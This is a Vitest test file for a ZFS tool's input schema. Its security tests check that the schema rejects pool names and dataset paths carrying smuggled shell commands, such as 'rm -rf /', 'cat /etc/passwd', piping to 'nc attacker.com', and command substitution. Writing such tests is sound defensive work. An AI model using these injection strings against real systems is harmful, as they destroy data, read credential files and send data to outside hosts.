// src/schemas/scout/zfs.test.ts
import { describe, it, expect } from 'vitest';
import { scoutZfsSchema } from './zfs.js';

describe('Scout ZFS Schema', () => {
  it('should validate pools subaction', () => {
    const result = scoutZfsSchema.parse({
      action: 'zfs',
      subaction: 'pools',
      host: 'dookie'
    });
    expect(result.subaction).toBe('pools');
  });

  it('should validate datasets with recursive', () => {
    const result = scoutZfsSchema.parse({
      action: 'zfs',
      subaction: 'datasets',
      host: 'dookie',
      pool: 'tank',
      recursive: true
    });
    expect(result.recursive).toBe(true);
  });

  it('should validate snapshots with limit', () => {
    const result = scoutZfsSchema.parse({
      action: 'zfs',
      subaction: 'snapshots',
      host: 'dookie',
      pool: 'tank',
      limit: 50
    });
    expect(result.limit).toBe(50);
  });

  it('should reject invalid subaction', () => {
    expect(() => scoutZfsSchema.parse({
      action: 'zfs',
      subaction: 'invalid',
      host: 'dookie'
    })).toThrow();
  });

  describe('pool name validation (security)', () => {
    it('should accept valid pool names', () => {
      const validPools = ['tank', 'rpool', 'data-pool', 'backup_pool', 'pool.v2'];
      for (const pool of validPools) {
        const result = scoutZfsSchema.parse({
          action: 'zfs',
          subaction: 'pools',
          host: 'dookie',
          pool
        });
        expect(result.pool).toBe(pool);
      }
    });

    it('should reject pool names with shell metacharacters', () => {
      const maliciousPools = [
        'tank; rm -rf /',
        'tank && cat /etc/passwd',
        'tank | nc attacker.com',
        'tank`whoami`',
        'tank$(id)',
        "tank'; DROP TABLE--",
        'tank\n rm -rf /',
        'tank > /dev/null',
        'tank < /etc/passwd'
      ];
      for (const pool of maliciousPools) {
        expect(() => scoutZfsSchema.parse({
          action: 'zfs',
          subaction: 'pools',
          host: 'dookie',
          pool
        })).toThrow(/Invalid pool name/);
      }
    });

    it('should reject pool names starting with non-letter', () => {
      const invalidPools = ['123pool', '-pool', '_pool', '.pool'];
      for (const pool of invalidPools) {
        expect(() => scoutZfsSchema.parse({
          action: 'zfs',
          subaction: 'pools',
          host: 'dookie',
          pool
        })).toThrow(/Invalid pool name/);
      }
    });
  });

  describe('dataset path validation (security)', () => {
    it('should accept valid dataset paths', () => {
      const validDatasets = ['tank', 'tank/data', 'tank/data/backup', 'rpool/ROOT/ubuntu'];
      for (const dataset of validDatasets) {
        const result = scoutZfsSchema.parse({
          action: 'zfs',
          subaction: 'snapshots',
          host: 'dookie',
          dataset
        });
        expect(result.dataset).toBe(dataset);
      }
    });

    it('should accept dataset paths with allowed special chars', () => {
      const validDatasets = ['tank/data-backup', 'tank/data_backup', 'tank/data.v2'];
      for (const dataset of validDatasets) {
        const result = scoutZfsSchema.parse({
          action: 'zfs',
          subaction: 'snapshots',
          host: 'dookie',
          dataset
        });
        expect(result.dataset).toBe(dataset);
      }
    });

    it('should reject dataset paths with shell metacharacters', () => {
      const maliciousDatasets = [
        'tank/data; rm -rf /',
        'tank/data && cat /etc/passwd',
        'tank/data | nc attacker.com',
        'tank/data`whoami`',
        'tank/data$(id)',
        'tank/data > /tmp/pwned',
        'tank/data\n/etc/passwd'
      ];
      for (const dataset of maliciousDatasets) {
        expect(() => scoutZfsSchema.parse({
          action: 'zfs',
          subaction: 'snapshots',
          host: 'dookie',
          dataset
        })).toThrow(/Invalid dataset path/);
      }
    });

    it('should reject dataset paths with double slashes or trailing slash', () => {
      const invalidDatasets = ['tank//data', 'tank/data/', '/tank/data'];
      for (const dataset of invalidDatasets) {
        expect(() => scoutZfsSchema.parse({
          action: 'zfs',
          subaction: 'snapshots',
          host: 'dookie',
          dataset
        })).toThrow(/Invalid dataset path/);
      }
    });
  });
});
